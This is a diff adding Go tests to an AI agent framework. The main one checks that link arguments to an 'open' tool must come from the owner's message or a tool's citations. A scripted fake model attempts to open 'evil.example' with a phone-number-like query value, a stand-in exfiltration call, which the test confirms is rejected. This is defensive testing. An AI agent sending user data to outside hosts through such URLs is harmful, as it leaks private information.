@@ -691,3 +691,59 @@ func TestAToolRunsNoMoreThanItsMaxCallsForOneMessage(t *testing.T) {
 		t.Fatalf("ran %d times, calls %+v", runs, res.Calls)
 	}
 }
+
+func TestALinkArgumentMustComeFromTheOwnerOrATool(t *testing.T) {
+	var opened []string
+	open := Tool{
+		Name: "open", Description: "Opens.", Links: []string{"url"},
+		Parameters: json.RawMessage(`{"type":"object","properties":{"url":{"type":"string"}},"required":["url"]}`),
+		Run: func(_ context.Context, raw json.RawMessage) (string, error) {
+			var a struct{ URL string }
+			_ = json.Unmarshal(raw, &a)
+			opened = append(opened, a.URL)
+			return "page", nil
+		},
+	}
+	search := Tool{
+		Name: "search", Description: "Searches.", Parameters: json.RawMessage(`{"type":"object"}`),
+		Run: func(ctx context.Context, _ json.RawMessage) (string, error) {
+			Cite(ctx, "https://www.Magicpin.in/hsr/truth-bowl/")
+			return "[1] Truth Bowl", nil
+		},
+	}
+	m := &model{locality: llm.Local, steps: []step{
+		calls(call("a", "search", `{}`)),
+		calls(call("b", "open", `{"url":"https://magicpin.in/hsr/truth-bowl"}`), call("c", "open", `{"url":"https://example.com/menu"}`),
+			call("d", "open", `{"url":"https://evil.example/?d=9876543210"}`)),
+		answer("ok"),
+	}}
+	res, err := Run(bg, Options{LLM: m, Tools: registry(t, search, open), Logger: quiet, OwnerWords: "ye dekh example.com/menu#top aur bata"}, question)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !slices.Equal(opened, []string{"https://magicpin.in/hsr/truth-bowl", "https://example.com/menu"}) || res.Calls[3].Outcome != BadArguments {
+		t.Fatalf("opened %v, calls %+v", opened, res.Calls)
+	}
+	if told := toolMessages(m.requests[2])[3].Content; !strings.Contains(told, "not a link they sent") {
+		t.Fatalf("told %q", told)
+	}
+}
+
+func TestAToolCanHaveItsOwnTimeout(t *testing.T) {
+	slow := Tool{
+		Name: "slow", Description: "Slow.", Parameters: json.RawMessage(`{"type":"object"}`), Timeout: 200 * time.Millisecond,
+		Run: func(ctx context.Context, _ json.RawMessage) (string, error) {
+			select {
+			case <-time.After(50 * time.Millisecond):
+				return "done", nil
+			case <-ctx.Done():
+				return "", ctx.Err()
+			}
+		},
+	}
+	m := &model{locality: llm.Local, steps: []step{calls(call("a", "slow", `{}`)), answer("ok")}}
+	res, err := Run(bg, Options{LLM: m, Tools: registry(t, slow), Logger: quiet, ToolTimeout: 10 * time.Millisecond}, question)
+	if err != nil || res.Calls[0].Outcome != Ran {
+		t.Fatalf("calls %+v, %v", res.Calls, err)
+	}
+}
